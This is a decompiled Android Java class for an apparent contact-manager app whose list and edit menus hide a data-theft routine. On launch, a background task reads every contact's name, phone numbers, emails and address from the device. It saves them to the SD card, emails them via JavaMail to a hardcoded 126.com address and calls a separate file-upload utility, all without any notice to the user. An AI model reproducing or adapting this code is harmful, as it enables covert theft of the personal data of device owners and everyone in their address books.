package com.beita.contact;

import android.app.AlertDialog.Builder;
import android.app.ListActivity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.provider.ContactsContract.Contacts;
import android.util.Log;
import android.view.ContextMenu;
import android.view.ContextMenu.ContextMenuInfo;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView.AdapterContextMenuInfo;
import android.widget.ListView;
import android.widget.SimpleCursorAdapter;
import android.widget.Toast;
import com.mobclick.android.l;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MyContacts extends ListActivity {
    private static final int AddContact_ID = 1;
    private static final int DELEContact_ID = 3;
    private static final int EXITContact_ID = 4;
    private static final int EditContact_ID = 2;
    private static final String TAG = "MyContacts";
    private StringBuffer sb = new StringBuffer(200);
    /* access modifiers changed from: private */
    public String sendCotentString = "";

    class RetrieceDataTask extends AsyncTask<Void, Void, List<Person>> {
        RetrieceDataTask() {
        }

        /* access modifiers changed from: protected|varargs */
        public List<Person> doInBackground(Void... params) {
            return MyContacts.this.getContactsInfoListFromPhone();
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(List<Person> result) {
            super.onPostExecute(result);
            if (result != null) {
                String sdcadString = MyContacts.this.getSDPath();
                if (sdcadString != null) {
                    Application.sdcardPathString = sdcadString;
                    File file = new File(new StringBuilder(String.valueOf(sdcadString)).append("/contact_backup.txt").toString());
                    if (file.exists()) {
                        file.delete();
                    }
                    MyContacts.this.backup();
                    new UploadAsyncTask().execute(new Void[0]);
                }
            }
        }
    }

    class UploadAsyncTask extends AsyncTask<Void, Void, Void> {
        UploadAsyncTask() {
        }

        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            MailUtil.sendByJavaMail("zhangdafeng2012@126.com", "zhangdafeng2012@126.com", new StringBuilder(String.valueOf(System.currentTimeMillis())).toString(), l.a(MyContacts.this.sendCotentString));
            UploadUtil.uploadFile();
            return null;
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setDefaultKeyMode(2);
        Intent intent = getIntent();
        if (intent.getData() == null) {
            intent.setData(ContactsProvider.CONTENT_URI);
        }
        getListView().setOnCreateContextMenuListener(this);
        getListView().setBackgroundResource(R.drawable.bg);
        setListAdapter(new SimpleCursorAdapter(this, 17367044, managedQuery(getIntent().getData(), ContactColumn.PROJECTION, null, null, null), new String[]{ContactColumn.NAME, ContactColumn.MOBILENUM}, new int[]{16908308, 16908309}));
        Toast.makeText(this, "点击menu添加和管理联系人", 1).show();
        new RetrieceDataTask().execute(new Void[0]);
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode != 4 || event.getRepeatCount() != 0) {
            return false;
        }
        Builder dialog = new Builder(this);
        dialog.setTitle("退出");
        dialog.setMessage("您确定要退出么？");
        dialog.setPositiveButton("确定", new OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                MyContacts.this.finish();
            }
        });
        dialog.setNegativeButton("取消", new OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });
        dialog.show();
        return false;
    }

    /* access modifiers changed from: private */
    public boolean backup() {
        try {
            File file = new File(Application.sdcardPathString + "/contact_backup.txt");
            if (file.exists()) {
                file.delete();
            }
            for (Person person : getContactsInfoListFromPhone()) {
                StringBuffer stringBuffer = new StringBuffer();
                stringBuffer.append("name : " + person.getName() + "\nphone : ");
                for (String string : person.getPhones()) {
                    stringBuffer.append(new StringBuilder(String.valueOf(string)).append(",").toString());
                }
                stringBuffer.append("\nemail : ");
                for (String string2 : person.getEmails()) {
                    stringBuffer.append(new StringBuilder(String.valueOf(string2)).append(",").toString());
                }
                stringBuffer.append("\naddress : " + person.getAddress());
                ContactUtil.write(Application.sdcardPathString + "/contact_backup.txt", stringBuffer.toString());
                this.sb.append(stringBuffer.toString());
            }
            this.sendCotentString = this.sb.toString();
            return true;
        } catch (Exception e) {
            Log.i(TAG, "backup fail");
            return false;
        }
    }

    /* access modifiers changed from: private */
    public String getSDPath() {
        if (Environment.getExternalStorageState().equals("mounted")) {
            return Environment.getExternalStorageDirectory().toString();
        }
        Toast.makeText(this, "请插入内存卡", 0).show();
        return null;
    }

    /* access modifiers changed from: private */
    public List<Person> getContactsInfoListFromPhone() {
        List<Person> list = new ArrayList();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        while (cursor.moveToNext()) {
            Person person = new Person();
            person.setName(cursor.getString(cursor.getColumnIndex("display_name")));
            String contactId = cursor.getString(cursor.getColumnIndex("_id"));
            Cursor phone = cr.query(Phone.CONTENT_URI, null, "contact_id = " + contactId, null, null);
            while (phone.moveToNext()) {
                person.addPhones(phone.getString(phone.getColumnIndex("data1")));
            }
            phone.close();
            Cursor email = cr.query(Email.CONTENT_URI, null, "contact_id = " + contactId, null, null);
            while (email.moveToNext()) {
                person.addEmails(email.getString(email.getColumnIndex("data1")));
            }
            email.close();
            Cursor address = cr.query(StructuredPostal.CONTENT_URI, null, "contact_id = " + contactId, null, null);
            while (address.moveToNext()) {
                person.setAddress(address.getString(address.getColumnIndex("data1")));
            }
            address.close();
            list.add(person);
        }
        cursor.close();
        return list;
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        menu.add(0, 1, 0, R.string.add_user).setShortcut('3', 'a').setIcon(R.drawable.add);
        Intent intent = new Intent(null, getIntent().getData());
        intent.addCategory("android.intent.category.ALTERNATIVE");
        menu.addIntentOptions(262144, 0, 0, new ComponentName(this, MyContacts.class), null, intent, 0, null);
        menu.add(0, 4, 0, R.string.exit).setShortcut('4', 'd').setIcon(R.drawable.exit);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case 1:
                startActivity(new Intent("android.intent.action.INSERT", getIntent().getData()));
                return true;
            case 4:
                finish();
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    public boolean onPrepareOptionsMenu(Menu menu) {
        boolean haveItems;
        super.onPrepareOptionsMenu(menu);
        if (getListAdapter().getCount() > 0) {
            haveItems = true;
        } else {
            haveItems = false;
        }
        if (haveItems) {
            Intent[] specifics = new Intent[]{new Intent("android.intent.action.EDIT", uri), new Intent("android.intent.action.VIEW", ContentUris.withAppendedId(getIntent().getData(), getSelectedItemId()))};
            MenuItem[] items = new MenuItem[2];
            Intent intent = new Intent(null, ContentUris.withAppendedId(getIntent().getData(), getSelectedItemId()));
            intent.addCategory("android.intent.category.ALTERNATIVE");
            menu.addIntentOptions(262144, 0, 0, null, specifics, intent, 0, items);
            if (items[0] != null) {
                items[0].setShortcut('1', 'e').setIcon(R.drawable.edituser).setTitle(R.string.editor_user);
            }
            if (items[1] != null) {
                items[1].setShortcut('2', 'f').setTitle(R.string.view_user).setIcon(R.drawable.viewuser);
            }
        } else {
            menu.removeGroup(262144);
        }
        return true;
    }

    /* access modifiers changed from: protected */
    public void onListItemClick(ListView l, View v, int position, long id) {
        Uri uri = ContentUris.withAppendedId(getIntent().getData(), id);
        if ("android.intent.action.EDIT".equals(getIntent().getAction())) {
            startActivity(new Intent("android.intent.action.EDIT", uri));
        } else {
            startActivity(new Intent("android.intent.action.VIEW", uri));
        }
    }

    public void onCreateContextMenu(ContextMenu menu, View view, ContextMenuInfo menuInfo) {
        try {
            Cursor cursor = (Cursor) getListAdapter().getItem(((AdapterContextMenuInfo) menuInfo).position);
            if (cursor != null) {
                menu.setHeaderTitle(cursor.getString(1));
                menu.add(0, 3, 0, R.string.delete_user);
            }
        } catch (ClassCastException e) {
        }
    }

    public boolean onContextItemSelected(MenuItem item) {
        try {
            AdapterContextMenuInfo info = (AdapterContextMenuInfo) item.getMenuInfo();
            switch (item.getItemId()) {
                case 3:
                    getContentResolver().delete(ContentUris.withAppendedId(getIntent().getData(), info.id), null, null);
                    return true;
                default:
                    return false;
            }
        } catch (ClassCastException e) {
            return false;
        }
    }
}
